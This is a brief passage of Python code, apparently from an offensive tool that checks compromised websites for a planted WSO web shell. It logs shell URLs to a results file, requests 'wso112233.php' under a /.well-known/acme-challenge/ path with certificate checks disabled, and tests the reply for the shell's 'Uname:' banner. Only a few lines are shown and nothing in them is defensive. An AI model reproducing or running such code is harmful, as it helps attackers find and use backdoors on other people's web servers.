            open('results/wso.txt', 'a').write(url_http + '/.well-knownold/wso112233.php\n')

        check = requests.get(url_http + '/.well-known/acme-challenge/wso112233.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
